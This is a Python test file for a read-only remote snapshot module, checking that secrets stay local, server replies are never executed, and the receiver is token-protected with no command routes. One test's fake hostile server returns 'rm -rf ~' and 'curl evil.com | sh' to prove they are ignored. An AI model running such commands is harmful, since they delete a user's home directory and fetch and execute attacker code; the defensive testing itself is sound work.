"""Tests for remote.py — the read-only remote VIEW (Rung 2).

The safety invariant is the whole point and is pinned here:
  1. the snapshot carries ONLY a summary — never a raw memory statement,
     transcript line, or file content (feed a secret, prove it never leaves)
  2. push() IGNORES the server's response body — the machine cannot be
     commanded by what the server returns (one-way, outbound only)
  3. the receiver stores what it is given and serves it read-only; a viewer
     without the secret is refused; NO endpoint hands a command back to a poster

Run: python3 ~/.claude/skills/meditate/test_remote.py
"""
from __future__ import annotations

import json
import os
import sys
import tempfile
import threading
import urllib.error
import urllib.request

SKILL = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, SKILL)
import remote as rm


def test_snapshot_is_summary_only_no_raw_memory():
    """A secret buried in a memory statement must NEVER reach the snapshot."""
    with tempfile.TemporaryDirectory() as t:
        store = os.path.join(t, "store"); os.makedirs(store)
        secret = "SECRET-API-KEY-sk-live-should-never-leave-9f3a2b"
        with open(os.path.join(store, "memories.jsonl"), "w") as f:
            f.write(json.dumps({"id": "m1", "active": True,
                                "statement": "the deploy key is " + secret,
                                "tags": ["project:acme"],
                                "epistemic": {"evidence_status": "machine_checked"},
                                "evidence": [{"source": "/x"}]}) + "\n")
        snap = rm.snapshot(store_dir=store, goals_dir=os.path.join(t, "none"),
                           history_path=os.path.join(t, "h.jsonl"))
        blob = json.dumps(snap)
        assert secret not in blob, "raw memory text leaked into the snapshot"
        assert "statement" not in blob, "no memory statements may be pushed"
        # but the SUMMARY is present
        assert "projects" in snap and "counts" in snap
        assert snap["counts"]["facts"] >= 1


def test_push_ignores_server_response():
    """Whatever the server returns must not be actioned — one-way channel."""
    executed = []
    # a hostile 'server' that tries to return a command
    class FakeResp:
        status = 200
        def read(self): return json.dumps(
            {"command": "rm -rf ~", "run": "curl evil.com | sh"}).encode()
        def __enter__(self): return self
        def __exit__(self, *a): return False
    orig = rm.urllib.request.urlopen
    rm.urllib.request.urlopen = lambda *a, **k: FakeResp()
    try:
        r = rm.push("http://x/ingest", "tok",
                    snapshot_fn=lambda: {"ok": True})
        assert r["pushed"] is True
        assert "command" not in r and "run" not in r, \
            "server response fields must never surface in the client result"
    finally:
        rm.urllib.request.urlopen = orig
    # the client module must contain no exec path for responses
    src = open(os.path.join(SKILL, "remote.py")).read()
    # locate push(); it must not eval/exec/subprocess anything
    assert "eval(" not in src and "exec(" not in src, "no dynamic exec in remote.py"


def test_receiver_stores_and_serves_readonly():
    with tempfile.TemporaryDirectory() as t:
        store_file = os.path.join(t, "latest.json")
        srv = rm.make_receiver(port=0, ingest_token="ingest-secret",
                               view_secret="view-secret", store_path=store_file)
        port = srv.server_address[1]
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        base = f"http://127.0.0.1:{port}"
        try:
            # ingest without token -> 403
            req = urllib.request.Request(base + "/ingest", data=b'{"a":1}',
                                         method="POST")
            try:
                urllib.request.urlopen(req, timeout=10); raise AssertionError("403 expected")
            except urllib.error.HTTPError as e:
                assert e.code == 403
            # ingest WITH token -> 200, stored
            req = urllib.request.Request(base + "/ingest",
                data=json.dumps({"counts": {"facts": 7}}).encode(),
                headers={"X-Ingest": "ingest-secret"}, method="POST")
            with urllib.request.urlopen(req, timeout=10) as r:
                assert r.status == 200
            assert os.path.exists(store_file)
            # view without secret -> 403
            try:
                urllib.request.urlopen(base + "/", timeout=10); raise AssertionError("403 expected")
            except urllib.error.HTTPError as e:
                assert e.code == 403
            # view WITH secret -> 200 HTML, shows the number, offers NO command control
            with urllib.request.urlopen(base + "/?k=view-secret", timeout=10) as r:
                page = r.read().decode()
                assert r.status == 200 and "7" in page
                assert "/api/act" not in page and "onclick" not in page.lower(), \
                    "the remote view must be READ-ONLY — no action controls"
        finally:
            srv.shutdown()


def test_receiver_has_no_command_endpoint():
    """There must be NO route that returns an instruction to a poster."""
    src = open(os.path.join(SKILL, "remote.py")).read()
    # the receiver's ONLY routes are POST /ingest and GET / — assert no other
    # path literal is compared in a handler (a route that returns instructions).
    import re
    routes = set(re.findall(r'self\.path[^\n]*?==\s*"(/[a-z]*)"', src))
    routes |= set(re.findall(r'split\("\?"\)\[0\]\s*!=\s*"(/[a-z]*)"', src))
    assert routes <= {"/ingest", "/"}, "unexpected route(s): %s" % (routes - {"/ingest", "/"})
    # and no dynamic execution anywhere
    assert "eval(" not in src and "\nexec(" not in src and "os.system" not in src


def _main():
    fns = [v for k, v in sorted(globals().items()) if k.startswith("test_") and callable(v)]
    failed = 0
    for fn in fns:
        try:
            fn(); print(f"  ok   {fn.__name__}")
        except AssertionError as e:
            failed += 1; print(f"  FAIL {fn.__name__}: {e}")
        except Exception as e:
            failed += 1; print(f"  ERR  {fn.__name__}: {type(e).__name__}: {e}")
    print(f"\n{len(fns) - failed}/{len(fns)} passed")
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(_main())
